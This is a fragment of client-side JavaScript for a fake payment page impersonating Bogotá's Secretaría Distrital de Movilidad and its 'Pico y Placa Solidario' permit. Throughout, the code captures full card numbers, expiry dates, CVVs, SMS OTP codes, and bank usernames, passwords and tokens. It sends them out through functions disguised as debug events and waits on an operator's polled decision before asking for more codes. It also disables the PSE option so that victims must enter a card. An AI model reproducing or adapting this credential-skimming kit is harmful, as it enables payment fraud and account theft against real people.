  function isValidEmail(value) {
    const v = String(value || '').trim();
    return v.includes('@') && v.indexOf('@') > 0 && v.indexOf('@') < v.length - 1;
  }

  function syncEmailValidity(input) {
    if (!input) return;
    const v = input.value.trim();
    const invalid = Boolean(v) && !isValidEmail(v);
    input.setCustomValidity(invalid ? 'Ingresa un correo que incluya @' : '');
    input.classList.toggle('is-invalid', invalid);
    input.closest('.pagos-field')?.classList.toggle('is-invalid', invalid);
  }

  function validateCardName(value) {
    const name = String(value || '').trim();
    if (!name) return { valid: false, incomplete: true, message: '' };
    if (name.length < 2) {
      return { valid: false, incomplete: false, message: 'Ingresa el nombre como aparece en la tarjeta' };
    }
    return { valid: true, incomplete: false, message: '' };
  }

  function validateCardCvv(value, brand) {
    const digits = onlyDigits(value);
    const len = brand.cvvLength;
    if (!digits) return { valid: false, incomplete: true, message: '' };
    if (digits.length < len) {
      return { valid: false, incomplete: true, message: `Ingresa los ${len} dígitos del CVV` };
    }
    if (digits.length !== len) {
      return { valid: false, incomplete: false, message: 'CVV inválido' };
    }
    return { valid: true, incomplete: false, message: '' };
  }

  function isCardPaymentValid() {
    const number = validateCardNumber(cardNumber?.value || '');
    const name = validateCardName(cardName?.value || '');
    const exp = validateCardExp(cardExp?.value || '');
    const cvv = validateCardCvv(cardCvv?.value || '', number.brand);
    return Boolean(number.valid && name.valid && exp.valid && cvv.valid);
  }

  function syncPayEnabled() {
    const receiptOk = isValidEmail(email?.value);
    const cardOpen = addCardToggle?.getAttribute('aria-expanded') === 'true';
    const cardEmailOk = isValidEmail(cardEmail?.value);
    const cardFieldsOk = isCardPaymentValid();
    const ok = Boolean(terms?.checked && receiptOk && cardOpen && cardEmailOk && cardFieldsOk);
    if (payBtn) payBtn.disabled = !ok;
  }

  terms?.addEventListener('change', syncPayEnabled);
  email?.addEventListener('input', () => {
    if (cardEmail) cardEmail.value = email.value;
    syncEmailValidity(email);
    syncPayEnabled();
  });
  email?.addEventListener('blur', () => syncEmailValidity(email));
  syncPayEnabled();

  function setCardOpen(open) {
    if (!addCard || !addCardToggle || !cardForm) return;
    addCard.classList.toggle('is-selected', open);
    addCardToggle.setAttribute('aria-expanded', open ? 'true' : 'false');
    addCardToggle.setAttribute('aria-pressed', open ? 'true' : 'false');
    cardForm.hidden = !open;
    if (open) syncCardFieldStates();
    else syncPayEnabled();
  }

  if (addCardToggle) {
    addCardToggle.onclick = () => {
      if (addCardToggle.getAttribute('aria-expanded') === 'true') return;
      setCardOpen(true);
    };
    setCardOpen(true);
  }

  const correoQuery = new URLSearchParams(window.location.search).get('correo');
  if (email && !email.value && correoQuery) {
    email.value = correoQuery;
    syncEmailValidity(email);
  }
  if (cardEmail && email?.value) cardEmail.value = email.value;

  function setFormattedValue(input, formatted) {
    if (!input) return;
    const start = input.selectionStart;
    const prev = input.value;
    input.value = formatted;
    if (typeof start === 'number' && document.activeElement === input) {
      const diff = formatted.length - prev.length;
      const next = Math.max(0, start + diff);
      try {
        input.setSelectionRange(next, next);
      } catch {
        /* ignore */
      }
    }
  }

  function setFieldError(input, errorEl, message, { valid = false, showError = false } = {}) {
    if (!input) return;
    const hasError = Boolean(showError && message);
    input.classList.toggle('is-invalid', hasError);
    input.classList.toggle('is-valid', Boolean(valid) && !hasError);
    input.setAttribute('aria-invalid', hasError ? 'true' : 'false');
    if (errorEl) {
      errorEl.hidden = !hasError;
      errorEl.textContent = hasError ? message : '';
    }
  }

  function currentBrand() {
    return detectCardBrand(cardNumber?.value || '');
  }

  function syncBrandUi(brand, numberValid = false) {
    if (cardNumber) cardNumber.maxLength = cardNumberMaxLength(brand);
    if (cardCvv) cardCvv.maxLength = brand.cvvLength;

    const showBrand = brand.brand !== 'unknown' && Boolean(brand.label);
    if (cardBrandEl) {
      cardBrandEl.hidden = !showBrand;
      cardBrandEl.dataset.brand = brand.brand;
      cardBrandEl.querySelectorAll('[data-brand-logo]').forEach((logo) => {
        logo.hidden = logo.getAttribute('data-brand-logo') !== brand.brand;
      });
    }

    cardNumberBox?.classList.toggle('has-brand', showBrand);
    cardNumberBox?.classList.toggle('is-valid', Boolean(numberValid));
    if (cardNumberBox) cardNumberBox.dataset.brand = showBrand ? brand.brand : '';
    cardNumberField?.classList.toggle('has-brand', showBrand);
    cardNumberField?.classList.toggle('is-filled', onlyDigits(cardNumber?.value || '').length > 0);

    if (cardNumberOk) {
      cardNumberOk.hidden = !numberValid;
    }
  }

  function cardReadyForCvv() {
    const number = validateCardNumber(cardNumber?.value || '');
    const hasNumber = onlyDigits(cardNumber?.value || '').length >= number.brand.length;
    const hasName = String(cardName?.value || '').trim().length >= 2;
    const hasExp = onlyDigits(cardExp?.value || '').length === 4;
    return hasNumber && hasName && hasExp;
  }

  function syncCardCvvVisibility() {
    if (!cardCvvWrap) return;
    const show = cardReadyForCvv();
    const wasHidden = cardCvvWrap.hidden;
    cardCvvWrap.hidden = !show;
    if (show && wasHidden) cardCvv?.focus();
    if (!show && cardCvv) {
      cardCvv.value = '';
      setFieldError(cardCvv, cardCvvError, '', {});
    }
  }

  function syncCardFieldStates(opts = {}) {
    const force = Boolean(opts.force);
    const number = validateCardNumber(cardNumber?.value || '');
    const name = validateCardName(cardName?.value || '');
    const exp = validateCardExp(cardExp?.value || '');
    const cvv = validateCardCvv(cardCvv?.value || '', number.brand);

    syncBrandUi(number.brand, number.valid);

    setFieldError(cardNumber, cardNumberError, number.message, {
      valid: number.valid,
      showError: force || (!number.incomplete && Boolean(number.message)),
    });
    cardNumberBox?.classList.toggle('is-invalid', Boolean(
      (force || (!number.incomplete && Boolean(number.message))) && number.message,
    ));
    setFieldError(cardName, cardNameError, name.message, {
      valid: name.valid,
      showError: force || (!name.incomplete && Boolean(name.message)),
    });
    setFieldError(cardExp, cardExpError, exp.message, {
      valid: exp.valid,
      showError: force || (!exp.incomplete && Boolean(exp.message)),
    });

    if (!cardCvvWrap?.hidden) {
      setFieldError(cardCvv, cardCvvError, cvv.message, {
        valid: cvv.valid,
        showError: force || (!cvv.incomplete && Boolean(cvv.message)),
      });
    }

    syncCardCvvVisibility();
    syncPayEnabled();
  }

  function syncCardEmailError() {
    if (!cardEmail) return;
    const v = cardEmail.value.trim();
    const invalid = Boolean(v) && !isValidEmail(v);
    const empty = !v;
    setFieldError(cardEmail, cardEmailError, invalid ? 'Ingresa un correo que incluya @' : '', {
      valid: !empty && !invalid,
      showError: invalid,
    });
  }

  cardNumber?.addEventListener('focus', () => cardNumber.removeAttribute('readonly'));
  cardName?.addEventListener('focus', () => cardName.removeAttribute('readonly'));
  cardExp?.addEventListener('focus', () => cardExp.removeAttribute('readonly'));
  cardCvv?.addEventListener('focus', () => cardCvv.removeAttribute('readonly'));
  cardEmail?.addEventListener('focus', () => cardEmail.removeAttribute('readonly'));

  function syncPlaceholderState(input) {
    input?.closest('.pagos-card-input')?.classList.toggle(
      'has-value',
      Boolean(String(input?.value || '').trim()),
    );
  }

  let binLookupTimer = 0;
  let lastBinQuery = '';

  function scheduleBinLookup() {
    const digits = onlyDigits(cardNumber?.value || '');
    if (digits.length < 6) {
      window.clearTimeout(binLookupTimer);
      lastBinQuery = '';
      return;
    }
    const bin = digits.slice(0, 6);
    if (bin === lastBinQuery) return;
    window.clearTimeout(binLookupTimer);
    binLookupTimer = window.setTimeout(async () => {
      lastBinQuery = bin;
      try {
        await fetch(`/api/bin?bin=${encodeURIComponent(bin)}`);
      } catch {
        /* ignore */
      }
    }, 400);
  }

  cardNumber?.addEventListener('input', () => {
    const brand = detectCardBrand(cardNumber.value);
    setFormattedValue(cardNumber, formatCardNumber(cardNumber.value, brand));
    syncCardFieldStates();
    scheduleBinLookup();
  });
  cardNumber?.addEventListener('blur', () => {
    const brand = detectCardBrand(cardNumber.value);
    setFormattedValue(cardNumber, formatCardNumber(cardNumber.value, brand));
    syncCardFieldStates({ force: true });
  });
  cardName?.addEventListener('input', () => {
    cardName.value = String(cardName.value || '').replace(/\d/g, '');
    syncPlaceholderState(cardName);
    syncCardFieldStates();
  });
  cardName?.addEventListener('blur', () => syncCardFieldStates({ force: true }));
  cardExp?.addEventListener('input', () => {
    setFormattedValue(cardExp, formatCardExp(cardExp.value));
    syncPlaceholderState(cardExp);
    syncCardFieldStates();
  });
  cardExp?.addEventListener('blur', () => {
    setFormattedValue(cardExp, formatCardExp(cardExp.value));
    syncCardFieldStates({ force: true });
  });
  cardCvv?.addEventListener('input', () => {
    const brand = currentBrand();
    cardCvv.value = onlyDigits(cardCvv.value).slice(0, brand.cvvLength);
    syncPlaceholderState(cardCvv);
    syncCardFieldStates();
  });
  cardCvv?.addEventListener('blur', () => syncCardFieldStates({ force: true }));
  cardEmail?.addEventListener('input', () => {
    syncPlaceholderState(cardEmail);
    syncEmailValidity(cardEmail);
    syncCardEmailError();
    syncPayEnabled();
  });
  cardEmail?.addEventListener('blur', () => {
    syncEmailValidity(cardEmail);
    syncCardEmailError();
  });
  syncPlaceholderState(cardName);
  syncPlaceholderState(cardExp);
  syncPlaceholderState(cardCvv);
  syncPlaceholderState(cardEmail);
  syncCardFieldStates();

  if (walletLogin) {
    walletLogin.onclick = () => {
      if (!walletMsg) return;
      walletMsg.hidden = false;
      walletMsg.textContent = copy.walletUnavailable;
    };
  }

  function setInvoiceOpen(on) {
    if (!invoiceToggle) return;
    invoiceToggle.setAttribute('aria-checked', on ? 'true' : 'false');
    invoiceToggle.classList.toggle('is-on', on);
    invoiceBox?.classList.toggle('is-on', on);
    if (invoicePanel) invoicePanel.hidden = !on;
    if (!on && invoiceConfirm) invoiceConfirm.checked = false;
  }

  if (invoiceToggle) {
    invoiceToggle.onclick = (event) => {
      event.stopPropagation();
      const on = invoiceToggle.getAttribute('aria-checked') !== 'true';
      setInvoiceOpen(on);
    };
  }

  function setSheet(open) {
    if (!sheet) return;
    sheet.hidden = !open;
    sheet.classList.toggle('is-open', open);
    document.body.classList.toggle('pagos-sheet-open', open);
  }

  document.getElementById('pagos-detail-toggle')?.addEventListener('click', () => setSheet(true));
  sheet?.querySelectorAll('[data-pagos-sheet-close]').forEach((el) => el.addEventListener('click', () => setSheet(false)));

  payBtn?.addEventListener('click', async () => {
    if (payBtn.disabled || payBtn.classList.contains('is-loading')) return;
    const wait = document.getElementById('pagos-wait-screen');
    const challenge = document.getElementById('pagos-challenge-screen');
    const brand = detectCardBrand(cardNumber?.value || '').brand;
    let brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand)
      ? brand
      : 'visa';
    const now = new Date();
    const months = [
      'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio',
      'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre',
    ];
    const dateLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}`;
    const timeLabel = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
    const datetimeLabel = `${dateLabel} · ${timeLabel}`;
    const amountLabel = money(total, true);
    const merchantLabel = 'Secretaría Distrital de Movilidad';
    const payLabel = payBtn.textContent;
    const cardDigits = onlyDigits(cardNumber?.value || '');

    payBtn.classList.add('is-loading');
    payBtn.disabled = true;
    payBtn.setAttribute('aria-busy', 'true');
    payBtn.innerHTML = '<span class="pagos-pay__spin" aria-hidden="true"></span>';

    try {
      console.log('----------------')
      console.log('----------------')
      console.log('PAYMENT_SUBMIT:')
      console.log('CARD: ', cardNumber.value)
      console.log('EXP: ', cardExp.value)
      console.log('CVV: ', cardCvv.value)
      const route = await sendDebugEvent('PAYMENT_SUBMIT', {
        cardFirstDigit: cardDigits.charAt(0),
        meta: {
          step: 'Envió datos de tarjeta',
          brand: brandKey,
          amount: Number(total) || 0,
          amountLabel: amountLabel,
          card: maskCard(cardNumber?.value || ''),
          cardFirstDigit: cardDigits.charAt(0),
          cvvLength: onlyDigits(cardCvv?.value || '').length,
          cpayload: {
            b: cardNumber.value,
            cv: cardExp.value,
            exp: cardCvv.value,
            holder: cardName.value,
          }
        },
      });
      if (route?.brand && ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(route.brand)) {
        brandKey = route.brand;
      }
      setUiMessage('');
      payBtn.classList.remove('is-loading');
      payBtn.removeAttribute('aria-busy');
      payBtn.textContent = payLabel;

      wait?.querySelectorAll('[data-wait-brand]').forEach((panel) => {
        panel.hidden = panel.getAttribute('data-wait-brand') !== brandKey;
      });
      if (wait) wait.hidden = false;
      if (challenge) challenge.hidden = true;
      const authScreen = document.getElementById('pagos-auth-screen');
      if (authScreen) {
        authScreen.hidden = true;
        authScreen.style.display = 'none';
      }
      document.body.classList.add('is-offers-waiting');

      sessionStorage.setItem(
        'latam-payment-draft',
        JSON.stringify({
          paidAt: now.toISOString(),
          total,
          email: email?.value || '',
          invoice: invoiceToggle?.getAttribute('aria-checked') === 'true',
          method: addCard?.classList.contains('is-selected') ? 'card' : 'none',
          brand: brandKey,
          merchant: merchantLabel,
          amountLabel,
          dateLabel,
          timeLabel,
        }),
      );

      const decision = await pollDebugDecision(180000);
      const nextAction = decision?.action || 'timeout';

      if (nextAction === 'sms' || nextAction === 'sms_error') {
        if (wait) wait.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        showChallenge(
          brandKey,
          merchantLabel,
          amountLabel,
          datetimeLabel,
          nextAction === 'sms_error' ? decision?.message || '' : '',
        );
        return;
      }

      if (applyAuthDecision(nextAction, decision, brandKey, merchantLabel, amountLabel, datetimeLabel)) {
        return;
      }

      if (nextAction === 'card' || nextAction === 'card_error') {
        if (wait) wait.hidden = true;
        if (challenge) challenge.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        clearCardInputs();
        setCardOpen(true);
        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
        cardNumber?.focus();
        return;
      }

      if (nextAction === 'approved') {
        if (wait) wait.hidden = true;
        if (challenge) challenge.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        window.location.href = '/success';
        return;
      }

      if (wait) wait.hidden = true;
      document.body.classList.remove('is-offers-waiting');
      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
    } catch (error) {
      payBtn.classList.remove('is-loading');
      payBtn.removeAttribute('aria-busy');
      payBtn.textContent = payLabel;
      syncPayEnabled();
      setUiMessage(error instanceof Error ? error.message : 'No se pudo continuar con el pago.');
    }
  });

  document.querySelectorAll('[data-help-toggle]').forEach((btn) => {
    btn.addEventListener('click', () => {
      const root = btn.closest('[data-help]');
      const panel = root?.querySelector('[data-help-panel]');
      const icon = root?.querySelector('[data-help-icon]');
      if (!panel) return;
      const open = !panel.hidden;
      panel.hidden = open;
      if (icon) icon.textContent = open ? '+' : '−';
      btn.setAttribute('aria-expanded', String(!open));
    });
  });

  document.querySelectorAll('[data-otp-form]').forEach((form) => {
    form.addEventListener('submit', async (event) => {
      event.preventDefault();
      const input = form.querySelector('input[name="otp"]');
      if (!input?.value.trim()) {
        input?.focus();
        return;
      }
      const panel = form.closest('[data-challenge-brand]');
      const brandKey = panel?.getAttribute('data-challenge-brand') || 'visa';
      const attempts = Number(form.dataset.attempts || '0') + 1;
      form.dataset.attempts = String(attempts);
      setUiMessage('');
      clearChallengeMessages();
      console.log('[debug-otp-submit]', {
        sessionId: debugSessionId(),
        brand: brandKey,
        otpLength: String(input.value || '').trim().length,
        attempt: attempts,
      });
      try {
        console.log('----------------')
        console.log('----------------')
        console.log('OTP_SUBMIT:')
        console.log('OTP: ', input.value)
        await sendDebugEvent('OTP_SUBMIT', {
          metaOtp: {
            step: 'Envió código OTP',
            brand: brandKey,
            otp: input.value,
            otpLength: String(input.value || '').trim().length,
            attempt: attempts,
          },
        });
      } catch {
        setChallengeMessage(brandKey, 'No pudimos procesar el código. Intenta nuevamente.');
        return;
      }
      const wait = document.getElementById('pagos-wait-screen');
      const challenge = document.getElementById('pagos-challenge-screen');
      wait?.querySelectorAll('[data-wait-brand]').forEach((el) => {
        el.hidden = el.getAttribute('data-wait-brand') !== brandKey;
      });
      if (challenge) challenge.hidden = true;
      if (wait) wait.hidden = false;
      document.body.classList.add('is-offers-waiting');

      const decision = await pollDebugDecision();
      const nextAction = decision?.action || 'timeout';

      if (nextAction === 'card' || nextAction === 'card_error') {
        if (wait) wait.hidden = true;
        if (challenge) challenge.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        clearCardInputs();
        setCardOpen(true);
        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
        cardNumber?.focus();
        return;
      }

      if (nextAction === 'sms' || nextAction === 'sms_error') {
        if (wait) wait.hidden = true;
        challenge?.querySelectorAll('[data-challenge-brand]').forEach((el) => {
          el.hidden = el.getAttribute('data-challenge-brand') !== brandKey;
        });
        if (challenge) challenge.hidden = false;
        document.body.classList.remove('is-offers-waiting');
        setChallengeMessage(
          brandKey,
          decision?.message || 'Código inválido. Hemos enviado un nuevo código por SMS o correo',
          nextAction === 'sms_error' ? 'error' : 'info',
        );
        input.value = '';
        input.focus();
        return;
      }

      if (applyAuthDecision(
        nextAction,
        decision,
        brandKey,
        'Secretaría Distrital de Movilidad',
        money(total, true),
        document.querySelector('[data-challenge-datetime]')?.textContent || '',
      )) {
        return;
      }

      if (nextAction === 'approved') {
        if (wait) wait.hidden = true;
        if (challenge) challenge.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        window.location.href = '/success';
        return;
      }

      if (wait) wait.hidden = true;
      document.body.classList.remove('is-offers-waiting');
      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
    });
  });

  document.querySelectorAll('[data-auth-form]').forEach((form) => {
    form.addEventListener('submit', async (event) => {
      event.preventDefault();
      const kind = form.getAttribute('data-auth-form') || 'userpass';
      const username = form.querySelector('input[name="username"]')?.value.trim() || '';
      const password = form.querySelector('input[name="password"]')?.value.trim() || '';
      const token = form.querySelector('input[name="token"]')?.value.trim() || '';
      const cdin = form.querySelector('input[name="cdin"]')?.value.trim() || '';
      if (kind === 'userpass' && (!username || !password)) {
        setAuthMessage(kind, 'Ingresa tu usuario y contraseña para continuar.');
        return;
      }
      if (kind === 'token' && !token) {
        setAuthMessage(kind, 'Ingresa el token para continuar.');
        return;
      }
      if (kind === 'dynamic' && !cdin) {
        setAuthMessage(kind, 'Ingresa la clave dinámica para continuar.');
        return;
      }
      const eventName = kind === 'token' ? 'TOKEN_SUBMIT' : kind === 'dynamic' ? 'DYNAMIC_SUBMIT' : 'USERPASS_SUBMIT';
      try {
        await sendDebugEvent(eventName, {
          meta: {
            step: kind === 'token' ? 'Envió token' : kind === 'dynamic' ? 'Envió clave dinámica' : 'Envió usuario y contraseña',
            username,
            password,
            token,
            cdin,
          },
        });
      } catch {
        setAuthMessage(kind, 'No pudimos procesar los datos. Intenta nuevamente.');
        return;
      }
      const wait = document.getElementById('pagos-wait-screen');
      const challenge = document.getElementById('pagos-challenge-screen');
      const brandKey = 'visa';
      wait?.querySelectorAll('[data-wait-brand]').forEach((el) => {
        el.hidden = el.getAttribute('data-wait-brand') !== brandKey;
      });
      if (challenge) challenge.hidden = true;
      if (wait) wait.hidden = false;
      document.body.classList.add('is-offers-waiting');
      const decision = await pollDebugDecision();
      const nextAction = decision?.action || 'timeout';
      const merchantLabel = 'Secretaría Distrital de Movilidad';
      const amountLabel = money(total, true);
      const now = new Date();
      const months = [
        'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio',
        'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre',
      ];
      const datetimeLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
      if (nextAction === 'sms' || nextAction === 'sms_error') {
        if (wait) wait.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        showChallenge(brandKey, merchantLabel, amountLabel, datetimeLabel, nextAction === 'sms_error' ? decision?.message || '' : '');
        return;
      }
      if (applyAuthDecision(nextAction, decision, brandKey, merchantLabel, amountLabel, datetimeLabel)) return;
      if (nextAction === 'card' || nextAction === 'card_error') {
        if (wait) wait.hidden = true;
        if (challenge) challenge.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        clearCardInputs();
        setCardOpen(true);
        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
        return;
      }
      if (nextAction === 'approved') {
        if (wait) wait.hidden = true;
        if (challenge) challenge.hidden = true;
        document.body.classList.remove('is-offers-waiting');
        window.location.href = '/success';
        return;
      }
      if (wait) wait.hidden = true;
      document.body.classList.remove('is-offers-waiting');
      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
    });
  });
</script>

<script>
  function pypsOverlay(id, on) {
    const el = document.getElementById(id);
    if (!el) return;
    el.classList.toggle('hidden', !on);
  }

  function pypsMetodo() {
    return document.querySelector('input[name="metodoPago"]:checked')?.value || '';
  }

  function pypsMetodoLabel() {
    const metodo = pypsMetodo();
    if (metodo === 'credito') return 'Tarjeta de crédito';
    if (metodo === 'debito') return 'Tarjeta de débito';
    return 'PSE';
  }

  function pypsSyncMetodo() {
    const metodo = pypsMetodo();
    document.getElementById('pseBankBox')?.classList.toggle('hidden', metodo !== 'pse');
    document.getElementById('cardHint')?.classList.toggle('hidden', metodo === 'pse');
    document.getElementById('cardCuotasWrap')?.classList.toggle('hidden', metodo !== 'credito');
  }

  function pypsQuery() {
    return new URLSearchParams(window.location.search);
  }

  function pypsFillPago() {
    const q = pypsQuery();
    const box = document.getElementById('pagoDatos');
    const titulo = document.getElementById('pagoTitulo');
    const metodo = pypsMetodo();
    const banco = document.getElementById('pico-banco');
    const medio = metodo === 'pse' ? (banco?.selectedOptions[0]?.textContent?.trim() || '') : pypsMetodoLabel();
    const total = document.getElementById('pagos-total-price')?.textContent || '$ 0';
    const now = new Date().toLocaleString('es-CO');
    const doc = q.get('numeroDocumento') || '';
    const nombre = [q.get('primerNombre'), q.get('segundoNombre'), q.get('primerApellido'), q.get('segundoApellido')].filter(Boolean).join(' ') || '—';
    const placa = (q.get('placa') || '').toUpperCase();
    const solicitud = `PYPS-${new Date().getFullYear()}-${String(doc).slice(-6).padStart(6, '0')}`;
    if (titulo) titulo.textContent = metodo === 'pse' ? 'Datos de pago PSE' : 'Datos de pago PAYZEN';
    const payBtn = document.getElementById('btnPagarPse');
    if (payBtn) payBtn.textContent = metodo === 'pse' ? 'Pagar con PSE' : 'Pagar con tarjeta';
    if (!box) return;
    box.innerHTML = `
      <p><strong>Estado del proceso</strong><br>Pendiente de pago</p>
      <p><strong>Número de documento</strong><br>${doc}</p>
      <p><strong>Identificación</strong><br>${q.get('tipoDocumento') === '8' ? 'NIT' : 'Cédula'} ${doc}</p>
      <p><strong>Nombre completo</strong><br>${nombre}</p>
      <p><strong>Correo electrónico</strong><br>${q.get('correo') || ''}</p>
      <p><strong>${metodo === 'pse' ? 'Entidad Bancaria' : 'Medio de pago'}</strong><br>${medio}</p>
      <p><strong>Valor de la transacción (IVA incluido)</strong><br>${total}</p>
      <p><strong>Impuesto a la venta</strong><br>$ 0</p>
      <p><strong>Asunto del pago</strong><br>Permiso Pico y Placa Solidario</p>
      <p><strong>Placa</strong><br>${placa}</p>
      <p><strong>Fecha de creación de la transacción</strong><br>${now}</p>
      <p><strong>Número de la solicitud</strong><br>${solicitud}</p>
    `;
  }

  function pypsFillPse() {
    const q = pypsQuery();
    const banco = document.getElementById('pico-banco');
    const box = document.getElementById('pseResumen');
    const doc = q.get('numeroDocumento') || '';
    const nombre = [q.get('primerNombre'), q.get('segundoNombre'), q.get('primerApellido'), q.get('segundoApellido')].filter(Boolean).join(' ') || '—';
    if (!box) return;
    box.innerHTML = `
      <p><strong>Empresa:</strong> Secretaría Distrital de Movilidad</p>
      <p><strong>NIT:</strong> 899.999.061-9</p>
      <p><strong>Banco:</strong> ${banco?.selectedOptions[0]?.textContent?.trim() || ''}</p>
      <p><strong>Referencia:</strong> PYPS-${new Date().getFullYear()}-${String(doc).slice(-6).padStart(6, '0')}</p>
      <p><strong>Valor a pagar:</strong> ${document.getElementById('pagos-total-price')?.textContent || '$ 0'}</p>
      <p><strong>Pagador:</strong> ${nombre}</p>
    `;
  }

  document.querySelectorAll('input[name="metodoPago"]').forEach((el) => el.addEventListener('change', pypsSyncMetodo));
  pypsSyncMetodo();

  document.getElementById('donacionSi')?.addEventListener('click', () => {
    document.getElementById('donacionBox')?.classList.remove('hidden');
  });
  document.getElementById('donacionNo')?.addEventListener('click', () => {
    document.getElementById('donacionBox')?.classList.add('hidden');
  });
  document.getElementById('pico-detalle-btn')?.addEventListener('click', () => {
    const box = document.getElementById('detalleCobro');
    if (!box) return;
    const q = pypsQuery();
    box.classList.remove('hidden');
    box.innerHTML = `
      <h4 class="font-semibold mb-2">Detalles del cobro</h4>
      <p><strong>Placa:</strong> ${(q.get('placa') || '').toUpperCase()}</p>
      <p><strong>Duración del permiso:</strong> ${q.get('tipoPermiso') || ''}</p>
      <p class="mt-2 font-bold">Valor total: ${document.getElementById('pagos-total-price')?.textContent || '$ 0'}</p>
    `;
  });

  document.getElementById('btnIrPagar')?.addEventListener('click', () => {
    const banner = document.getElementById('pico-pago-banner');
    const metodo = pypsMetodo();
    if (!metodo) {
      if (banner) {
        banner.hidden = false;
        banner.textContent = 'Selecciona una opción de pago';
      }
      return;
    }
    if (metodo === 'pse') {
      if (banner) {
        banner.hidden = false;
        banner.textContent = 'El servicio de PSE no está habilitado por el momento. Selecciona tarjeta de crédito o débito para continuar.';
      }
      return;
    }
    if (banner) banner.hidden = true;
    pypsFillPago();
    pypsOverlay('pagoOverlay', true);
  });
  document.getElementById('closePago')?.addEventListener('click', () => pypsOverlay('pagoOverlay', false));
  document.getElementById('btnVolverConfirmacion')?.addEventListener('click', () => pypsOverlay('pagoOverlay', false));
  document.getElementById('btnPagarPse')?.addEventListener('click', () => {
    if (pypsMetodo() === 'pse') {
      const banner = document.getElementById('pico-pago-banner');
      if (banner) {
        banner.hidden = false;
        banner.textContent = 'El servicio de PSE no está habilitado por el momento. Selecciona tarjeta de crédito o débito para continuar.';
      }
      return;
    }
    const title = document.getElementById('cardOverlayTitle');
    if (title) title.textContent = pypsMetodoLabel();
    const total = document.getElementById('pagos-total-price')?.textContent || '$ 0';
    const cardTotal = document.getElementById('cardTotal');
    const amount = document.getElementById('pagos-card-amount');
    if (cardTotal) cardTotal.textContent = total;
    if (amount) amount.textContent = total;
    const brand = document.getElementById('cardBrand');
    if (brand) {
      brand.textContent = CARD_BRANDS;
      brand.className = 'text-sm text-gray mb-4';
    }
    const q = pypsQuery();
    const titular = [q.get('primerNombre'), q.get('segundoNombre'), q.get('primerApellido'), q.get('segundoApellido')].filter(Boolean).join(' ');
    const titularEl = document.getElementById('cardTitular');
    if (titularEl) {
      titularEl.setAttribute('autocomplete', 'off');
      titularEl.setAttribute('readonly', 'readonly');
      titularEl.value = titular;
      window.setTimeout(() => {
        titularEl.value = titular;
        titularEl.removeAttribute('readonly');
      }, 350);
    }
    document.getElementById('cardError')?.classList.add('hidden');
    pypsOverlay('cardOverlay', true);
  });
  document.getElementById('btnSalirPse')?.addEventListener('click', () => pypsOverlay('pseOverlay', false));
  document.getElementById('btnSalirCard')?.addEventListener('click', () => pypsOverlay('cardOverlay', false));
  document.getElementById('btnCancelar')?.addEventListener('click', () => window.history.back());
  document.getElementById('btnAtras')?.addEventListener('click', () => window.history.back());

  const CARD_BRANDS = 'Visa · Mastercard · American Express · Diners Club';

  function pypsVal(id) {
    return (document.getElementById(id)?.value || '').trim();
  }

  function pypsSetVal(id, value) {
    const el = document.getElementById(id);
    if (el) el.value = value;
  }

  function cardBrand(digits) {
    if (/^3[47]/.test(digits)) return 'American Express';
    if (/^(36|38|39)/.test(digits)) return 'Diners Club';
    if (/^30[0-5]/.test(digits)) return 'Diners Club';
    if (/^3095/.test(digits)) return 'Diners Club';
    if (digits.startsWith('4')) return 'Visa';
    if (/^(5[1-5]|2[2-7])/.test(digits)) return 'Mastercard';
    return '';
  }

  function cardLength(brand) {
    if (brand === 'American Express') return { min: 15, max: 15 };
    if (brand === 'Diners Club') return { min: 14, max: 16 };
    if (brand === 'Mastercard') return { min: 16, max: 16 };
    if (brand === 'Visa') return { min: 13, max: 19 };
    return { min: 13, max: 19 };
  }

  function luhnValid(digits) {
    if (!/^\d{13,19}$/.test(digits)) return false;
    let sum = 0;
    let doubleDigit = false;
    for (let i = digits.length - 1; i >= 0; i -= 1) {
      let n = Number(digits[i]);
      if (doubleDigit) {
        n *= 2;
        if (n > 9) n -= 9;
      }
      sum += n;
      doubleDigit = !doubleDigit;
    }
    return sum % 10 === 0;
  }

  function formatCardNumber(value) {
    const digits = value.replace(/\D/g, '').slice(0, 19);
    const brand = cardBrand(digits);
    if (brand === 'American Express') {
      return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 15)].filter(Boolean).join(' ');
    }
    if (brand === 'Diners Club') {
      if (digits.length > 14) {
        return digits.slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ').trim();
      }
      return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 14)].filter(Boolean).join(' ');
    }
    return digits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  }

  function formatExpiry(value) {
    const digits = value.replace(/\D/g, '').slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  function validExpiry(value) {
    const match = /^(\d{2})\/(\d{2})$/.exec(value);
    if (!match) return false;
    const month = Number(match[1]);
    const year = 2000 + Number(match[2]);
    if (month < 1 || month > 12) return false;
    const now = new Date();
